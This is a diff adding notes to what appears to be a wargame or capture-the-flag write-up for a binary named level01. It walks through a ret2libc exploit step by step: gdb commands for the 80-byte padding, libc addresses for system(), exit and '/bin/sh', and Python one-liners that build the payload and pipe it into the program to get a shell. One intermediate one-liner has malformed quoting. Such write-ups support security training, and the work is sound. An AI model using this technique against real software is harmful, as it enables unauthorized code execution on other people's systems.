@@ -1,3 +1,5 @@
+# Breakdown
+
 we can see two functions 
 
 verify_user_name
@@ -10,3 +12,43 @@ so we need to use ret2libc exploit
 
 we can see that second input through fgets writes input to stack so we can rewrite eip to system address
 
+
+# The exact payload
+
+First, calculate the padding. 
+
+Two ways:
+
+1. `info stack` to see where the saved EIP is and x/50xd to print the whole stack and eyeball 80 bytes
+2. The variable that fgets is writing to is $esp+01c which is 0x...67c, and saved eip is 0x...6cc. 6cc-67c=80
+
+
+Find system():
+
+info func system 
+
+> 0xf7e6aed0
+
+
+Find bin sh
+
+info proc map
+
+> where libc is in the proc memory mappings
+
+find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+
+> 0xf7f897ec
+
+# Writing the payload
+
+[80 bytes of padding] [address of system()] [return pointer for system (address of exit)] [addr of "/bin/sh" as an argument]
+
+python -c "import struct;print("80*'a'" + struct.pack("I", 0xf7e6aed0))"
+
+
+exit 0xf7e5eb70
+
+python -c "import struct;print('dat_wil\n'+80*'a' + struct.pack('I', 0xf7e6aed0)+ struct.pack('I', 0xf7e5eb70) + struct.pack('I', 0xf7f897ec))" > /tmp/e1
+
+cat /tmp/e1 - | ./level01
